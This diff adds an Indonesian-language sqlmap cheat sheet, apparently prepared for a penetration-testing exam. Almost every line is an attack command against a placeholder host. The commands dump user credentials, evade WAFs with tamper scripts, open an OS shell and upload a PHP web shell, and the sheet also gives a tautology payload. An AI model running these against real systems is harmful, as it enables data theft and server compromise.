@@ -1,0 +1,94 @@
+
+---
+
+# SQLMAP CHEATSHEET
+
+1. Scan Dasar
+
+---
+
+Uji parameter GET:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)"
+
+Uji parameter POST:
+sqlmap -u "[http://target.com/login.php](http://target.com/login.php)" --data="username=admin\&password=123"
+
+2. Enumerasi Database
+
+---
+
+List semua database:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --dbs
+
+List semua tabel dalam database tertentu:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" -D targetdb --tables
+
+List semua kolom dalam tabel tertentu:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" -D targetdb -T users --columns
+
+Dump isi tabel tertentu:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" -D targetdb -T users --dump
+
+Dump kolom tertentu saja:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" -D targetdb -T users -C username,password --dump
+
+3. Bypass Filter & WAF
+
+---
+
+Gunakan level dan risk lebih tinggi:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --level=5 --risk=3
+
+Gunakan tamper script:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --tamper=space2comment
+
+4. Opsi Otomatisasi
+
+---
+
+Skip semua pertanyaan interaktif:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --batch
+
+Scan semua parameter URL:
+sqlmap -u "[http://target.com/page.php?id=1\&cat=2](http://target.com/page.php?id=1&cat=2)" -p all
+
+5. Eksploitasi Lanjutan
+
+---
+
+Cek user database:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --current-user
+
+Cek database yang sedang digunakan:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --current-db
+
+Cek privileges user DB:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --privileges
+
+Jalankan perintah OS (jika RCE mungkin):
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --os-shell
+
+Upload file ke server (jika punya akses):
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" --file-write shell.php --file-dest /var/www/html/shell.php
+
+6. Output & Logging
+
+---
+
+Simpan hasil ke file:
+sqlmap -u "[http://target.com/index.php?id=1](http://target.com/index.php?id=1)" -o
+
+Secara default, semua hasil disimpan di:
+\~/.sqlmap/output/<target-host>/
+
+7. Tips Praktis
+
+---
+
+* Mulai dengan payload dasar (`' OR '1'='1`) untuk validasi manual.
+* Gunakan --batch untuk hemat waktu saat ujian.
+* Fokus ke parameter yang *dynamic* (id, pid, cat, page).
+* Jika tidak ada hasil, coba --level=5 --risk=3.
+* Dokumentasikan setiap dump (screenshot + copy query).
+
+---
